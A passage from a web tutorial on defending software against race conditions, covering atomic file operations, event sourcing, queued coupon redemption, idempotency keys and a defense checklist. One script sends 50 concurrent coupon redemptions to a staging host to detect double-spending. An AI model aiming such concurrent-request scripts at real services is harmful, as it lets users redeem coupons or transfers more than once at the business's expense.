<span class="code-keyword">int</span> fd = open(<span class="code-string">"/dev/shm/tempfile"</span>, O_CREAT | O_EXCL | O_RDWR, <span class="code-keyword">0600</span>);

<span class="code-comment">-- O_EXCL ensures atomic creation (fails if exists)</span>
<span class="code-comment">-- Use file descriptors, not paths, for all operations</span>

<span class="code-comment">-- Python: tempfile with exclusive creation</span>
<span class="code-keyword">import</span> tempfile
<span class="code-keyword">import</span> os

<span class="code-keyword">with</span> tempfile.NamedTemporaryFile(
    mode=<span class="code-string">'w'</span>, 
    delete=<span class="code-keyword">False</span>,
    dir=<span class="code-string">'/secure/tmp'</span>
) <span class="code-keyword">as</span> f:
    f.write(sensitive_data)
    temp_path = f.name

<span class="code-comment">-- Atomic rename (POSIX guarantee)</span>
os.<span class="code-function">rename</span>(temp_path, final_path)  <span class="code-comment">-- Atomic on same filesystem</span>

<span class="code-comment">-- Avoid: open(path), check, then use path again</span>
<span class="code-comment">-- Always: open(path) -> fstat(fd) -> use fd</span>

<span class="code-comment">-- Java NIO: Atomic file moves</span>
Files.<span class="code-function">move</span>(
    source, 
    target, 
    StandardCopyOption.ATOMIC_MOVE,
    StandardCopyOption.REPLACE_EXISTING
);</code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Architecture Patterns</h3>
        <p class="text-content">
          Design your application architecture to inherently avoid race conditions through proper state management and
          queue-based processing.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Race-Free Architecture</span></div>
          <pre><code><span class="code-comment">-- Event sourcing: All state changes as immutable events</span>
<span class="code-keyword">CREATE TABLE</span> events (
    id <span class="code-keyword">SERIAL PRIMARY KEY</span>,
    aggregate_id <span class="code-keyword">VARCHAR</span>(<span class="code-keyword">255</span>),
    event_type <span class="code-keyword">VARCHAR</span>(<span class="code-keyword">100</span>),
    payload <span class="code-keyword">JSONB</span>,
    created_at <span class="code-keyword">TIMESTAMP DEFAULT</span> NOW()
);

<span class="code-comment">-- Single-threaded event processor</span>
<span class="code-comment">-- No races because only one process updates state</span>

<span class="code-comment">-- Queue-based processing</span>
<span class="code-comment">-- All coupon redemptions go to single queue</span>
<span class="code-keyword">await</span> redis.<span class="code-function">lpush</span>(<span class="code-string">'coupon_queue'</span>, JSON.stringify({
    userId: <span class="code-string">'user_123'</span>,
    coupon: <span class="code-string">'SAVE20'</span>
}));

<span class="code-comment">-- Single worker processes sequentially</span>
<span class="code-keyword">while</span> (<span class="code-keyword">true</span>) {
    <span class="code-keyword">const</span> job = <span class="code-keyword">await</span> redis.<span class="code-function">brpop</span>(<span class="code-string">'coupon_queue'</span>, <span class="code-keyword">0</span>);
    <span class="code-keyword">await</span> <span class="code-function">processRedemption</span>(JSON.<span class="code-function">parse</span>(job[<span class="code-keyword">1</span>]));
}

<span class="code-comment">-- Idempotency keys for safe retries</span>
<span class="code-keyword">POST</span> /api/transfer
Idempotency-Key: <span class="code-string">550e8400-e29b-41d4-a716-446655440000</span>

<span class="code-comment">-- Server stores processed keys for 24 hours</span>
<span class="code-comment">-- Duplicate requests with same key return cached result</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 6: Testing and Monitoring</h3>
        <p class="text-content">
          Implement continuous testing for race conditions and monitor for exploitation attempts in production.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Race Detection Testing</span></div>
          <pre><code><span class="code-comment">-- Stress testing with concurrent requests</span>
<span class="code-keyword">import</span> asyncio
<span class="code-keyword">import</span> aiohttp

<span class="code-keyword">async def</span> <span class="code-function">race_test</span>():
    <span class="code-keyword">async with</span> aiohttp.ClientSession() <span class="code-keyword">as</span> session:
        tasks = []
        <span class="code-keyword">for</span> _ <span class="code-keyword">in</span> <span class="code-function">range</span>(<span class="code-keyword">50</span>):
            task = session.post(
                <span class="code-string">'https://staging.example.com/api/redeem'</span>,
                json={<span class="code-string">'coupon'</span>: <span class="code-string">'TEST10'</span>}
            )
            tasks.append(task)
        
        responses = <span class="code-keyword">await</span> asyncio.<span class="code-function">gather</span>(*tasks)
        successes = <span class="code-function">sum</span>(<span class="code-keyword">1</span> <span class="code-keyword">for</span> r <span class="code-keyword">in</span> responses <span class="code-keyword">if</span> r.status == <span class="code-keyword">200</span>)
        
        <span class="code-keyword">if</span> successes > <span class="code-keyword">1</span>:
            <span class="code-function">print</span>(<span class="code-string">f"RACE CONDITION: {successes} successes from 1 coupon!"</span>)

<span class="code-comment">-- Monitor for race exploitation patterns</span>
<span class="code-keyword">class</span> <span class="code-function">RaceMonitor</span> {
    <span class="code-function">detectAnomaly</span>(requests) {
        <span class="code-comment">-- Flag: Same coupon used by different users within 1 second</span>
        <span class="code-keyword">const</span> grouped = _.groupBy(requests, <span class="code-string">'coupon'</span>);
        <span class="code-keyword">for</span> (<span class="code-keyword">const</span> [coupon, reqs] <span class="code-keyword">of</span> Object.entries(grouped)) {
            <span class="code-keyword">const</span> uniqueUsers = <span class="code-keyword">new</span> <span class="code-function">Set</span>(reqs.map(r => r.userId));
            <span class="code-keyword">if</span> (uniqueUsers.size > <span class="code-keyword">1</span> && 
                <span class="code-keyword">this</span>.<span class="code-function">timeWindow</span>(reqs) < <span class="code-keyword">1000</span>) {
                <span class="code-keyword">this</span>.<span class="code-function">alert</span>(<span class="code-string">'Potential race exploitation'</span>, {coupon, users});
            }
        }
    }
}</code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Defense Layer</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Implementation</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Priority</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Atomic Operations</td>
              <td style="padding: 0.75rem;">Combine check+use in single query (UPDATE...WHERE)</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Database Locking</td>
              <td style="padding: 0.75rem;">SELECT FOR UPDATE, row-level locks</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Distributed Locks</td>
              <td style="padding: 0.75rem;">Redis Redlock, ZooKeeper, Consul</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Optimistic Locking</td>
              <td style="padding: 0.75rem;">Version numbers, compare-and-swap</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">File Descriptors</td>
              <td style="padding: 0.75rem;">Use fd-based ops, O_NOFOLLOW, O_EXCL</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Queue Processing</td>
              <td style="padding: 0.75rem;">Single-threaded workers, event sourcing</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Idempotency</td>
              <td style="padding: 0.75rem;">Idempotency keys for safe retries</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for Race Conditions</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete race condition protection implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>